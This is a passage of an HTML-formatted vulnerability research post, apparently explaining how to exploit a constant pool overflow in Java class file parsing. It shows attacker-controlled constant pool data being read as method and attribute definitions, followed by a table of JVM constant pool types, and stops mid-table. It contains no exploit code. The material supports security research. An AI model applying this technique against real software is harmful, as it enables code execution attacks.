style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">This means that </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">constant_pool_count</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> will now contain a small value and that parts of the attacker-controlled constant pool will get interpreted as the class fields following the constant pool, including method and attribute definitions.&nbsp;</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Exploiting a constant pool overflow</span></h2><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">To understand how we can exploit this, we first need to take a closer look at the content of the constant pool.&nbsp; Each entry in the pool starts with a 1-byte tag describing the kind of constant, followed by the actual data. The table below shows an incomplete list of constant types supported by the JVM (see the </span><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4:~:text=Table%C2%A04.4%2DB.%C2%A0Constant%20pool%20tags%20(by%20tag)" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">official documentation</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> for a complete list). No need to read through all of them but we will come back to this table a lot when walking through the exploit.&nbsp;</span></p><div align="left" dir="ltr" style="margin-left: 0.75pt;"><table style="border-collapse: collapse; border: none;"><colgroup><col width="210"></col><col width="37"></col><col width="114"></col><col width="251"></col></colgroup><tbody><tr style="height: 24.25pt;"><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt; text-align: center;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">Constant Kind</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt; text-align: center;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">Tag</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt; text-align: center;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">Description</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt; text-align: center;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">Layout</span></p></td></tr><tr style="height: 23.5pt;"><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.7" style="text-decoration-line: none;"><span style="background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_Utf8</span></a></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">1</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Constant variable-sized UTF-8 string value</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_Utf8_info {</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u1 tag;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 length;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u1 bytes[length];</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /></td></tr><tr style="height: 23.5pt;"><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.4" style="text-decoration-line: none;"><span style="background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_Integer</span></a></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">3</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">4-byte integer</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_Integer_info {</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u1 tag;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u4 bytes;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /></td></tr><tr style="height: 23.5pt;"><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.4" style="text-decoration-line: none;"><span style="background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_Float</span></a></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">4</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">4-byte float</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_Float_info {</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u1 tag;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u4 bytes;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /></td></tr><tr style="height: 23.5pt;"><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.1" style="text-decoration-line: none;"><span style="background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_Long</span></a></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">5</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">8-byte long</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_Long_info {</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u1 tag;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u4 high_bytes;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u4 low_bytes;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /></td></tr><tr style="height: 23.5pt;"><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.1" style="text-decoration-line: none;"><span style="background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_Double</span></a></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">6</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">8-byte double</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_Double_info {</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u1 tag;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u4 high_bytes;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u4 low_bytes;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p></td></tr><tr style="height: 23.5pt;"><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.1" style="text-decoration-line: none;"><span style="background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_Class</span></a></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">7</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Reference to a class. Links to a Utf8 constant describing the name.</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_Class_info {</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u1 tag;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 name_index;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /></td></tr><tr style="height: 23.5pt;"><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.3" style="text-decoration-line: none;"><span style="background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_String</span></a></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">8</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">A JVM String. Links to a UTF8 constant.&nbsp;</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_String_info {</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u1 tag;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 string_index;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /></td></tr><tr style="height: 23.5pt;"><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.2" style="text-decoration-line: none;"><span style="background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_Fieldref</span></a></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="http://constant_methodref" style="text-decoration-line: none;"><span style="background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_Methodref</span></a></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="http://constant_methodref" style="text-decoration-line: none;"><span style="background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_InterfaceMethodref</span></a></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid 